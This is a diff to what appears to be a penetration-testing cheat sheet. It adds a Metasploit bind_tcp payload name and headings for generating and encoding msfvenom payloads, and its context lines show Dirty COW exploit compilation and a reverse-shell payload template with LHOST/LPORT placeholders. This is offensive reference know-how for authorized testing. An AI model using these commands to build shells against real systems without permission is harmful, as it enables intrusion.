@@ -470,7 +470,9 @@ gcc -pthread 40839.c -o dirty -lcrypt
 ```
 windows/meterpreter/reverse_tcp
 windows/x64/meterpreter/reverse_tcp
+
 windows/meterpreter/bind_tcp
+windows/x64/meterpreter/bind_tcp
 ```
 - For quick reference.
 
@@ -482,6 +484,7 @@ set LPORT <port>
 ```
 
 ### msfvenom
+#### Generating Payloads
 - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 
 ```
@@ -490,6 +493,9 @@ msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <f
 - `<architecture>`: `x86`, `x64`
 - `<payload>`: Pick your poison from `msfvenom --list payloads`
 - `<format>`: Pick your poison from `msfvenom --list formats`
+
+#### Encoding Payloads
+
 
 ## ProFTPD 1.3.3c
 ```
